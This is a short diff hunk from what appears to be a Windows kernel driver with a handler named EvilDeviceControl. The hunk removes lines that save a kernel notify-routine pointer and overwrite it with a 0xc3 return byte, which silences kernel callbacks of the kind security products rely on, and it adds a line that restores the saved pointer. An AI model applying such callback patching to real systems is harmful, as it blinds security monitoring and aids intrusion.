@@ -384,8 +384,7 @@ NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 						}
 
 						PULONG64 pPointer = (PULONG64)NotifyAddr;
-						memcpy((g_StoreAddress + i * 8), pPointer, 8);
-						*pPointer = (ULONG64)0xc3;
+						memcpy(pPointer,(g_StoreAddress + i * 8),8);
 
 						for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
 						{
